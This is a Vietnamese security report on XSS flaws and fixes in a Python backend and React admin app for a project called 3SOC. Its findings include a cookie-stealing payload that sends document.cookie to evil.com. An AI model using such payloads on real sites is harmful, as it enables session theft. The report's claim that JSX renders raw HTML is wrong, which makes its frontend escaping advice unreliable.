# XSS Protection - Triển khai bảo mật chống Cross-Site Scripting

## XSS là gì?

**Cross-Site Scripting (XSS)** là lỗ hổng bảo mật cho phép kẻ tấn công chèn mã độc (thường là JavaScript) vào trang web của người dùng khác. Khi trình duyệt render nội dung không được sanitize, mã độc sẽ thực thi trong ngữ cảnh phiên làm việc của nạn nhân, dẫn đến:

- **Đánh cắp session token / cookie** → Chiếm quyền tài khoản
- **Đánh cắp thông tin cá nhân** (email, username, dữ liệu nhạy cảm)
- **Thực hiện hành động thay mặt nạn nhân** (xóa file, thay đổi mật khẩu, tạo user admin mới)
- **Redirect đến trang lừa đảo (phishing)**
- **Tự lây lan** — XSS stored trong DB có thể ảnh hưởng nhiều người dùng

## Các loại XSS có thể khai thác trong project

| Loại | Mô tả | Áp dụng vào 3SOC |
|------|-------|-----------------|
| **Stored XSS** | Mã độc lưu trong DB, render khi người dùng xem trang | Upload file tên `<script>...</script>.mp4` → tên lưu vào DB → admin xem danh sách file → script chạy |
| **Reflected XSS** | Mã độc phản hồi ngay trong response | Toast message hiển thị username: `Chào mừng <script>...</script>!` |
| **DOM-based XSS** | Mã độc thực thi ở phía client thông qua DOM manipulation | `dangerouslySetInnerHTML` trong chart component |

## Các lỗ hổng đã phát hiện

### HIGH — Backend không sanitize filename

**File:** `3soc/app/routers/files.py`

Khi upload file, backend nhận `file.filename` từ người dùng, chỉ decode URL (`unquote`) rồi lưu trực tiếp vào database mà không loại bỏ ký tự nguy hiểm.

```
Kẻ tấn công upload file tên:
  <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">.mp4

→ Backend lưu nguyên tên vào DB
→ Admin xem trang Files → filename render trong <span> → XSS chạy
```

### HIGH — Admin Files page render filename trực tiếp

**File:** `3soc-admin-web/app/files/page.tsx` (dòng ~252)

```tsx
// TRƯỚC — Không an toàn
<span className="font-medium">{file.filename}</span>
```

Nếu filename chứa HTML/JS (do bypass được backend), trình duyệt sẽ render và thực thi.

### MEDIUM — DetectionModal render fileName không escape

**File:** `3soc-admin-web/components/DetectionModal.tsx` (dòng ~50)

```tsx
// TRƯỚC — Không an toàn
<DialogTitle>Kết quả phát hiện ({fileName || '—'})</DialogTitle>
```

### MEDIUM — Login page reflected XSS qua toast

**File:** `3soc-admin-web/app/login/page.tsx` (dòng ~42)

```tsx
// TRƯỚC — Không an toàn
description: `Chào mừng ${username}!`
```

Kẻ tấn công có thể thử đăng nhập với username chứa script — nếu login fail, error message vẫn có thể bị inject.

### MEDIUM — Users page render username/email không escape

**File:** `3soc-admin-web/app/users/page.tsx` (dòng ~264-265)

```tsx
// TRƯỚC — Không an toàn
<td className="p-4 font-medium">{user.username}</td>
<td className="p-4">{user.email}</td>
```

### LOW — TopBar render username trong dropdown

**File:** `3soc-admin-web/components/TopBar.tsx` (dòng ~110)

```tsx
// TRƯỚC — Không an toàn
<DropdownMenuLabel>{userName}</DropdownMenuLabel>
```

## Biện pháp đã triển khai

### 1. Backend — Sanitize Filename (Python)

**File:** `3soc/app/routers/files.py`

Thêm hàm `sanitize_filename()` loại bỏ ký tự nguy hiểm trước khi lưu:

```python
DANGEROUS_FILENAME_PATTERN = re.compile(r'[<>&"\'/\\;`$!#%\^*\=\+@{}()\[\]~]')

def sanitize_filename(filename: str) -> str:
    """Remove potentially dangerous characters from filenames to prevent XSS."""
    # Bước 1: Strip HTML tags (VD: <script>alert(1)</script> → alert(1))
    cleaned = re.sub(r'<[^>]*>', '', filename)
    # Bước 2: Xóa ký tự nguy hiểm còn lại
    cleaned = DANGEROUS_FILENAME_PATTERN.sub('', cleaned)
    # Bước 3: Giới hạn độ dài
    cleaned = cleaned[:255]
    return cleaned.strip()
```

**Ký tự bị loại bỏ và lý do:**

| Ký tự | Lý do |
|-------|-------|
| `<` `>` | Mở/đóng HTML tag — dùng để inject `<script>`, `<img>`, `<iframe>` |
| `&` | Bắt đầu HTML entity — có thể dùng để bypass filter |
| `"` `'` | Thoát khỏi attribute value trong HTML tag |
| `/` `\\` | Đường dẫn file, có thể dùng để thoát context |
| `;` | Kết thúc statement trong JavaScript |
| `` ` `` | Template literal trong JS |
| `$` | Variable interpolation trong template literal |
| `!` `#` `%` `^` `*` `=` `+` `@` | Ký tự đặc biệt thường dùng trong XSS payload |
| `{` `}` `(` `)` `[` `]` | Cú pháp JavaScript |
| `~` | Ký tự đặc biệt, có thể dùng trong một số payload |

**Áp dụng tại:**
- `upload_file()` — sanitize filename khi upload video
- `detect_image()` — sanitize filename khi detect image

### 2. Frontend — HTML Entity Encoding (TypeScript)

**File mới:** `3soc-admin-web/lib/escapeHtml.ts`

```typescript
export function escapeHtml(str: string): string {
    if (!str) return '';
    return str
        .replace(/&/g, '&amp;')    // & → &amp;  (phải replace trước!)
        .replace(/</g, '&lt;')     // < → &lt;
        .replace(/>/g, '&gt;')     // > → &gt;
        .replace(/"/g, '&quot;')   // " → &quot;
        .replace(/'/g, '&#x27;');  // ' → &#x27;
}
```

**Tại sao replace `&` trước?** Nếu replace sau, các ký tự `&lt;` `&gt;` đã tạo ra sẽ bị encode tiếp thành `&amp;lt;` `&amp;gt;` — sai.

**Kết quả encode:**

| Input | Output |
|-------|--------|
| `<script>` | `&lt;script&gt;` |
| `"onerror="` | `&quot;onerror=&quot;` |
| `'alert(1)'` | `&#x27;alert(1)&#x27;` |
| `&nbsp;` | `&amp;nbsp;` |

### 3. Các component đã áp dụng escapeHtml

| File | Trường được escape | Dòng thay đổi |
|------|-------------------|---------------|
| `app/files/page.tsx` | `file.filename`, `file.owner.username` | ~252, ~258 |
| `app/page.tsx` | `selectedFile.name` | ~229 |
| `components/DetectionModal.tsx` | `fileName` trong Dialog title | ~50 |
| `app/users/page.tsx` | `user.username`, `user.email` | ~264-265 |
| `app/login/page.tsx` | `username` trong toast | ~42 |
| `components/TopBar.tsx` | `userName` trong dropdown | ~110 |
| `app/settings/page.tsx` | Import sẵn (chuẩn bị) | — |

## Nguyên tắc hoạt động — Defense in Depth

```
  KEO: Upload file tên "<script>alert(document.cookie)</script>.mp4"
                              │
                              ▼
                    ╔═══════════════════════════╗
                    ║  LỚP 1: Backend (Python)  ║
                    ║  sanitize_filename()       ║
                    ║  → Loại bỏ < > / \ ; ...   ║
                    ║  → "scriptalertdocumentco ║
                    ║    okiescript.mp4"          ║
                    ╚═══════════════════════════╝
                              │
                              ▼
                    Lưu vào DB với tên đã sanitize
                              │
                              ▼
                    ╔═══════════════════════════╗
                    ║  LỚP 2: Frontend (React)  ║
                    ║  escapeHtml()              ║
                    ║  → Nếu bypass được backend ║
                    ║    vẫn bị encode ở frontend║
                    ╚═══════════════════════════╝
                              │
                              ▼
                    Hiển thị an toàn trong trình duyệt
                    "<script>" → "&lt;script&gt;" (hiển thị dạng text)
```

## File đã thay đổi

### Backend
| File | Thay đổi |
|------|----------|
| `3soc/app/routers/files.py` | Thêm `sanitize_filename()` + áp dụng cho upload và detect image |

### Frontend (Admin Web)
| File | Thay đổi |
|------|----------|
| `3soc-admin-web/lib/escapeHtml.ts` | **File mới** — utility escape HTML entities |
| `3soc-admin-web/app/files/page.tsx` | Escape filename + owner username |
| `3soc-admin-web/app/page.tsx` | Escape selected file name |
| `3soc-admin-web/app/users/page.tsx` | Escape username + email |
| `3soc-admin-web/app/login/page.tsx` | Escape username trong toast |
| `3soc-admin-web/app/settings/page.tsx` | Import escapeHtml |
| `3soc-admin-web/components/DetectionModal.tsx` | Escape filename trong dialog title |
| `3soc-admin-web/components/TopBar.tsx` | Escape username trong dropdown |

## Phụ thuộc (Dependencies)

**KHÔNG cần cài thêm thư viện.**

- Backend: dùng `re` — module có sẵn của Python
- Frontend: tự viết `escapeHtml()` bằng JavaScript thuần, zero-dependency

## Mobile App (3soc-app)

React Native sử dụng native UI components (`<Text>`, `<View>`) thay vì DOM/HTML nên không bị XSS trực tiếp. Không cần áp dụng `escapeHtml` cho mobile app.

## Các biện pháp có thể bổ sung trong tương lai

| Biện pháp | Mô tả | Ưu tiên |
|-----------|-------|---------|
| **Content Security Policy (CSP)** | Thêm HTTP header `Content-Security-Policy` để chặn inline script | Cao |
| **HTTPOnly cookies** | Chuyển JWT từ `localStorage` sang `httpOnly` cookie | Cao |
| **Server-side input validation** | Thêm whitelist cho filename (chữ, số, `.`, `-`, `_`) | Trung bình |
| **Database constraint** | Thêm CHECK constraint reject filename chứa ký tự nguy hiểm | Trung bình |
| **Dompurify library** | Thay `escapeHtml()` bằng `dompurify` nếu cần render HTML an toàn | Thấp |
| **Security headers** | `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` | Cao |
